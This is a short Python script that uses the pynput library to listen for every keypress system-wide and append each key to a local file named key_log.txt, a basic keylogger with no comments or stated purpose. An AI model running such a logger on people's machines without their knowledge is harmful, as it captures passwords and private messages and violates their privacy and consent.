from pynput import keyboard

def on_press(key):
    with open("key_log.txt", "a") as key_log_file:
        key_log_file.write(f"{key}\n")


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()